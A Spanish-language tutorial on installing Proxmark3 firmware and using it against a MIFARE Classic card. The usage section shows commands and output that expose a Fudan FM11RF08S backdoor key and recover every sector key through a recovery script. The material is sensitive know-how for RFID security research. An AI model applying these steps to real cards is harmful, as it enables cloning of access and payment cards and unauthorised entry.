# Que es ProxmarkV3 ? 

El ProxmarkV3 es un dispositivo que te permite leer y grabar comunicaciones de radiofrecuencia 13Mhz y 135khz, pudiendo analizar las comunicaciones de los dispositivos que usan estas, NFC y RFID por ejemplo. Esto lo hace atraves del sofware mantenido por la comunidad en github en el [repo](https://github.com/RfidResearchGroup/proxmark3.git), el cual tiene todo tipo de herramientas para explotar al maximo este dispositivo, y poder penetrar la seguridad de este tipo de tecnologias, con sus respectivos limites al hardware.  Esta formado por 3 partes el lector de low frequency 135khz, y el lector high frequency 13Mhz, y el microcontrolador **AT91SAM7S512 (ARM7TDMI, 512KB flash, 64KB RAM)** ,  este chip es mas rapido que el tipico arduino, y es el que se encarga de correr el firmware que controla los lectores y orquesta los ataques. Todo este hardware es de arquitectura abierta de ahi que existan clones chinos. 

# Instalacion

**El proxmark ya lleva un firmware por defecto pero suele estar muy desactualizado, dejando mucho que desear a la hora de realizar ataques, lo mejor es actualizar.** 

La instalacion es bastante simple y se podria resumir en x pasos. Si bien antes de realizar la,  lo mejor es  checkear el **README** del repositorio antes, pues tiene *warnings*. 
Un warning importante es **deshabilitar modemmanager** si vas a actualizar el firmware . **( De no hacerlo podria brickearse por un intento de este servicio de establecer una comunicacion con un modem tipo 4G 3G LTE )**

1.  Lo primero instalar las dependencias : ```
	sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config \
	libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev \
	libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev```
	
	*Si no usaras scripts de python puedes quitar libpython, si no usaras el cliente grafico 
	puedes quitar qtbase5, y si no usaras comunicacion por bluetooth puedes quitar 
	libbluethoth*

2.  Seguido tocaria clonar el repo:
	``` git clone https://github.com/RfidResearchGroup/proxmark3.git && cd proxmark3``

4.  Luego compilamos, es importante saber que plataforma de proxmark tenemos en mi caso es un clon chino asi que uso el siguiente alias en el platform :
	``` make clean &&  make PLATFORM=PM3GENERIC all```

5.  Ahora hay que conectar el proxmark al pc y verificar el puerto al que esta conectado : 
	```dmesg | grep tty``` *Normalmente /dev/ttyACM0 o /dev/ttyUSB0*
	**Recordemos apagar el modemmanager**

6.  Ejecutar los dos scripts pm3-flash-bootrom   pm3-flash-fullimage. Hay que darle al boton del lateral antes de cada ejecucion para que entre en el modo bootloader. Se encienden las luces del modo bootloader. 
	*El ultimo paso no me funciono a la primera pero si a la segunda cabe destacar que a mi el pm3-flash-all no me funciono.  

###### Hecho esto la instalacion esta finalizada y podemos iniciar el programa de la proxmax con el script pm3.  ```./pm3 ```

# Uso
Una vez arrancado el `./pm3` , para usarlo contra una tarjeta mifare classic podemos usar los siguientes comandos:
``` bash
hf mf info
```
esto nos da información muy valiosa, a parte de poder ver que sectores tienen contraseña por defecto, también podemos identificar los que no. también podemos extraer la clave de backdoor que dejan los desarrolladores para poder entrar a la tarjeta en modo debug y poder leer todo, para sacar todas las claves desde el modo debug, podemos ejecutar el script que nos recomienda el propio output del comando anterior:
``` bash
[=] --- ISO14443-a Information -----------------------------  
[+]  UID: 35 EC 8A B4    
[+] ATQA: 00 04  
[+]  SAK: 08 [1]  
  
[=] --- Keys Information  
[+] loaded 2 user keys  
[+] loaded 61 hardcoded keys  
[+] Sector 0 key A... FFFFFFFFFFFF  
[+] Sector 0 key B... FFFFFFFFFFFF  
[+] Sector 1 key A... FFFFFFFFFFFF  
[+] Sector 1 key B... FFFFFFFFFFFF  
[+] Backdoor key..... A396EFA4E24F  
[+] Block 0.......... 35EC8AB4E7080400041674BE015D8090 | ..t..]..  
  
[=] --- Fingerprint  
[+] Fudan FM11RF08S 0490  
  
[=] --- Magic Tag Information  
[=] <n/a>  
  
[=] --- PRNG Information  
[+] Prng....... weak  
[+] Static enc nonce... yes  
[?] Hint: Try `script run fm11rf08s_recovery.py`
```
como podemos ver, el comando `script run fm11rf08s_recovery.py` nos extrae las contraseñas a traves del modo backdoor/recovery:
``` bash
[+] -----+-----+--------------+---+--------------+----  
[+]  Sec | Blk | key A        |res| key B        |res  
[+] -----+-----+--------------+---+--------------+----  
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  002 | 011 | 6C9127BEF580 | 1 | 6C9127BEF580 | 1    
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  006 | 027 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  007 | 031 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1    
[+]  032 | 131 | AF55E2B254C9 | 1 | 0000563B602F | 1    
[+] -----+-----+--------------+---+--------------+----
```
ademas, a parte de este output, también se nos informa de que hay un dumpeo de los datos en binario, el cual podemos codificar en ASCII o cualquier text encoding para poder leer los datos.
